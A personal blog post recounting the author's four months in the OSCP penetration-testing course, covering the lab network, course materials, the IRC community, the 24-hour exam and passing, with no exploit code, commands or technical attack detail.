<p>Offensive Security Certified Professional.  Possibly one of the most intensive self learning course I&rsquo;ve had the privilege of spending my hard earned cash on.  The only course that gives you a full lab environment to compromise - with no less than 50 VM&rsquo;s of varying shapes, sizes, OS and vulnerability levels.  Ranging from simple boxes that can be compromised with a cough, to boxes that make you tear your hair out for days while looking for a route in.  I am not allowed to go into detail about the labs, or individual machines, but I can tell you there are some absolute brain teasers in there.</p>

<p>So, lets rewind a bit.  Personally, I&rsquo;ve not really spent that much time using applications like Metasploit or similar.  I&rsquo;ve got a fair amount of computer and network knowledge, plus a logical mind - how hard can the course be ?  I read up on people&rsquo;s experiences and it seemed to be the course for me (I have no significant other, or kids, therefore I could spend 6 hours every evening sat in front of my laptop - like a real hacker !), so I pulled out the ol&#8217; BarclayCard and signed up.  Now I was into the waiting game.  You have to choose a starting date, on which you&rsquo;ll receive an email providing course materials (more on that in a sec) and VPN configuration.</p>

<p>Connection to the labs is via VPN, which is incredibly stable considering the amount of traffic you send through it - this is a testament to the skill of the OffSec admins.   Once you&rsquo;re VPN&rsquo;d in, the labs are your oyster.</p>

<p>The course material is very professional - a PDF of nearly 400 pages, plus over 150 videos - which cover varying pentest techniques from port scanning to SQL injection.  It&rsquo;s a bit daunting at first, but Muts walks you through each example with a soothing voice and with clear concise instructions.  He&rsquo;s like that awesome science teacher you once had at school - you know the one.</p>

<p>The techniques you learn in the videos/PDF are only a small part of the learning required for OSCP.  It is expected that the student performs self study via other resources.  Varying blogs, google searches, wikipedia etc can be used to expand your knowledge, and I found myself initially looking for a particular technique only to disappear down a rabbit hole of related exploits, techniques and vulnerability disclosure write ups.  When they said &ldquo;self study&rdquo; they meant it !</p>

<p>Other than learning an immense amount of skills, I&rsquo;ve met some amazingly clever people via the provided IRC channel (#offsec on Freenode).  The channel is full of admins (who you &ldquo;ping&rdquo; when you need a hint), alumni and students.  I found that certain people were always online when I was, and we naturally teamed up to pool our resources and excitedly boast about compromising the complicated boxes.  Those people were also a sounding block for when the course got too much, or the outcome looked like it was completely fruitless.  Sometimes just talking to these guys resulted in a different path opening up and a compromise minutes later on a box I&rsquo;d wasted 3 days on.</p>

<p>As a personal challenge, I decided I would root every single box available to me, which I achieved.  My final report (which you have to write and submit) was 388 pages long just for the labs !  The exam is the pinnacle of the whole process, where you&rsquo;re given 24 hours to compromise a subset of boxes to get points.  I&rsquo;m not saying you chase after the numbers, but it&rsquo;s very tempting to try and get every point possible.</p>

<p>After 8 hours into the exam (of which the latter 5 hours were just me going nowhere) I had compromised 1 box.  I was ready to give up, but the aforementioned people I&rsquo;d met in the channel urged me to continue and virtually slapped some sense into me.  Within a further 2.5 hours I&rsquo;d accumulated enough points to pass.  I decided to quit while I was ahead and write my exam report.  A further 40 pages of documentation was added, and submitted to the OffSec team along with my lab report.  Now I had to wait for my result&hellip;</p>

<p>My result arrived on the 1st April, in the afternoon (I guess so it didn&rsquo;t look like an April Fools joke).  A pass - that&rsquo;s all you&rsquo;re told - there&rsquo;s no score, no feedback on your report.  Just that wonderful sentence that tells you you&rsquo;ve passed and are now OSCP certified.  Nice.</p>

<p>In the 4 months I spent doing the course I have laughed, I&rsquo;ve cried, I&rsquo;ve stressed out, I&rsquo;ve jumped for joy.  I think I experienced every kind of emotion.  It was fun going into the office and printing out a new diagram showing the new boxes I&rsquo;d compromised the previous evening.  The thrill of being able to explain some of the techniques to people I work with and have them sit there in awe at the cool stuff I&rsquo;d been doing.</p>

<p>So, what next ?  Well - the next step is OSCE.  But that&rsquo;s for another day.</p>
]]></content>
  </entry>
  
</feed>
